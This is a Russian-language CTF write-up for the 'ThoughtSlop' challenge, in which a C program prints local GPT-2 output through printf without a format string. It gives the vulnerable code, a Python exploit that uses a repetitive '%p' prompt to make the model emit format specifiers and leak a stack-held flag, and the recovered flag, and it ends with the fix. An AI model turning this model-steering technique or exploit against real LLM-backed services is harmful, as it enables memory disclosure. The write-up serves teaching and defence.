# ThoughtSlop — RSTCon CTF Writeup

**Категория:** pwn (format string) · Oct 24, 2026 · @Demian

## TL;DR

ThoughtSlop — pwn-таск: бинарь на C с фронтендом llama.cpp, который крутит локальную GPT-2 и печатает её вывод. Сгенерированный моделью текст попадает в `printf(output_buf)` без формат-строки — классический **format string**. Флаг читается в стековый буфер `char flag[48]` того же кадра `run()`.

Хитрость в том, что сам промпт в вывод не попадает — формат-строку должна породить модель. GPT-2 охотно зацикливается на повторяющемся вводе, поэтому ввод `"%p %p %p ..."` заставляет её сыпать `%p`, а `printf` вываливает стек вместе с флагом. Остаётся собрать его из hex-слов.

## Разведка: где баг

Ключевой код из `run()` (упрощённо):

```c
void run() {
    char flag[FLAG_SIZE];              // FLAG_SIZE = 48, флаг на стеке
    char *output_buf = calloc(1, MAX_OUTPUT);
    ...
    read_flag(flag);                   // читает ./flag.txt в flag[]
    ...
    while (running) {
        fgets(input_buf, BUF_SIZE, stdin);        // наш промпт
        // ... генерация токенов моделью -> output_buf ...
        for (int i = 0; i < MAX_NEW_TOKENS; i++) {
            llama_token t = llama_sampler_sample(sampler, ctx, -1);
            // ...
            strncat(output_buf, piece, cur);      // в output_buf — только текст МОДЕЛИ
        }
        printf(output_buf);            // <-- FORMAT STRING
    }
}
```

Два факта, которые делают таск решаемым:

- `printf(output_buf)` — строка формата полностью управляется содержимым `output_buf`. Спецификаторы `%p`/`%x`/`%s` будут интерпретированы и начнут читать аргументы из регистров и со стека.
- `flag[48]` лежит на стеке в кадре `run()` — ровно там, куда дотянется `%p`.

Что с защитами:

- В `Makefile` только `-m64 -w`, никакого `-O`. Без оптимизации `_FORTIFY_SOURCE` неактивен, значит `printf` НЕ становится `__printf_chk` — формат-строка работает в полную силу (даже `%n` прошёл бы, но для флага хватит чтения).
- PIE/ASLR не мешают: читаем значения прямо со стека через `%p`, адреса знать не нужно.
- Stack canary роли не играет — мы ничего не перезаписываем, только читаем.

## Ключевой трюк: заставить модель сыпать «слоп»

Главная идея (и смысл названия *thought slop*): в `output_buf` попадает только то, что сгенерировала GPT-2, а не наш ввод. Значит формат-строку должна выдать сама модель.

GPT-2 — это предсказатель следующего токена, и у маленькой модели (124M) очень сильный приор на повторение. Если скормить ей вырожденный повторяющийся ввод `%p %p %p %p ...`, самое вероятное продолжение — ещё `%p %p %p ...`. Эти токены склеиваются в `output_buf`, и `printf` получает длинную строку из десятков `%p`.

Почему это надёжно:

- **Детерминизм.** Сэмплер инициализируется фиксированным сидом: `llama_sampler_init_dist(42)`. А `llama_memory_clear(...)` чистит KV-кэш в начале каждого хода, так что ходы независимы. Один и тот же ввод → один и тот же вывод. Нашёл рабочий промпт один раз — он воспроизводится и локально, и на удалёнке.
- **Разделитель важен.** Лучше слать ` %p  ` или `%p|` (с пробелом/разделителем), а не слитно `%p%p%p`. Иначе `printf` напечатает `0x..0x..` без границы, и hex-значения слипнутся — их не распарсить.
- **`%p`, а не `%s`.** `%p` просто печатает значение аргумента как указатель и ничего не разыменовывает. `%s`/`%n` могут дёрнуть мусорный адрес и уронить дочерний процесс. Для чтения стекового флага достаточно `%p`.

## Утечка и сборка флага

`%p` печатает значения аргументов printf: сначала регистры (rsi, rdx, rcx, r8, r9), потом слова со стека. Чем больше `%p` — тем выше по стеку мы читаем, и в какой-то момент попадаем в байты `flag[]`.

Флаг лежит как `char flag[48]`, то есть это просто байты на стеке. Каждый `%p` вытаскивает одно 64-битное слово = 8 байт флага в **little-endian**. Собираем все утёкшие `0x...`, пакуем обратно как 8-байтовые LE-слова, склеиваем и ищем `rstcon{...}`.

Пример куска дампа (из локального прогона макета с тестовым флагом):

```
... 0x747b6e6f63747372 0x615f73315f733168 0x657479625f38345f ...
```

Разворачиваем каждое слово в little-endian:

| Leaked qword | Байты (LE) | ASCII |
| --- | --- | --- |
| 0x747b6e6f63747372 | 72 73 74 63 6f 6e 7b 74 | rstcon{t |
| 0x615f73315f733168 | 68 31 73 5f 31 73 5f 61 | h1s\_1s\_a |
| 0x657479625f38345f | 5f 34 38 5f 62 79 74 65 | \_48\_byte |

Склеиваем по порядку → `rstcon{...}`. На реальном бинаре смещение другое (между кадром printf и `flag[]` лежат указатели llama-контекста), поэтому дампим с запасом: `MAX_NEW_TOKENS = 128` даёт до \~128 слов стека, этого хватает, чтобы дотянуться до флага.

## Эксплойт

Полный эксплойт на сокетах stdlib (без pwntools):

```python
#!/usr/bin/env python3
import socket, sys, re, struct, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8888

# GPT-2 продолжит повтор -> output_buf наполнится "%p " -> printf дампит стек.
PROMPT = ("%p " * 42).strip()

def drain(s, secs):
    s.settimeout(0.5); end = time.time() + secs; out = b""
    while time.time() < end:
        try:
            c = s.recv(4096)
            if not c: break
            out += c; end = time.time() + 2.0
        except socket.timeout:
            pass
    return out

s = socket.create_connection((HOST, PORT), timeout=10)
drain(s, 3.0)                       # баннер + приветствие
s.sendall(PROMPT.encode() + b"\n")
data = drain(s, 8.0)                # Thinking.... + утечка

mem = b""
for v in re.findall(rb"0x[0-9a-fA-F]+", data):
    mem += struct.pack("<Q", int(v, 16) & (2**64 - 1))
printable = bytes(b if 32 <= b < 127 else 0x2e for b in mem)
m = re.search(rb"rstcon\{[^}]*\}", printable)
print("FLAG:", m.group().decode() if m else "not found")
```

Запуск:

- **По удалёнке:** `python3 solve.py <host> <port>`
- **Локально** (поднять их же докер и проверить): `docker build -t slop . && docker run -p 8888:8888 slop`, затем `python3 solve.py 127.0.0.1 8888`.

`socat` в `run.sh` поднят с `pty`, поэтому наш ввод эхо-ится обратно, а переводы строк идут как CRLF. На парсинг это не влияет: из всего потока мы выдёргиваем только `0x...`, а текстовое эхо `%p %p` в hex не попадает. Если флаг не собрался — модель не насыпала достаточно `%p`; увеличь длину промпта или смени разделитель и дампи глубже.

## Флаг и выводы

```
rstcon{nuclear_0pti0n_trash_EVERYTHING}
```

Имя флага — прямой намёк на подход: *nuclear option, trash EVERYTHING*. Не нужно никакой точной эксплуатации — достаточно заставить модель насыпать спецификаторов и выгрести со стека всё подряд, а флаг найти уже в дампе.

Что стоит унести с собой:

- **Вывод LLM — это недоверенный ввод.** Он ничем не безопаснее пользовательского: прокидывать его в `printf`, `system`, `eval`, SQL и т.п. нельзя. Здесь это буквально `printf(вывод_модели)`.
- **Фикс тривиален:** `printf("%s", output_buf)` (или `fputs(output_buf, stdout)`). Строка формата должна быть константой.
- **Модель как «усилитель» атаки.** Атакующий не пишет формат-строку сам — он подводит модель к тому, чтобы она сгенерировала её. Повторяющийся/вырожденный промпт — надёжный способ управлять выводом маленькой языковой модели.
